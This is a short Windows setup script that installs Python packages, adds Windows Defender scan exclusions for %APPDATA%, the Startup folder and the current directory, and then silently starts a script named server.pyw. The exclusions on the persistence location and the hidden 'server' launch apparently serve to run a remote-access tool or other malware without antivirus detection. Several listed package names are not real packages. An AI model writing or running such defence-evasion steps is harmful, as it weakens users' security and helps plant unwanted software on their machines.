python -m pip install --upgrade pip
python -m pip install pywin32 requests subprocess.run sockets winshell pythonw psutil
powershell -Command Add-MpPreference -ExclusionPath "%APPDATA%"
powershell -Command Add-MpPreference -ExclusionPath "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
powershell -Command Add-MpPreference -ExclusionPath "%CD%"
start server.pyw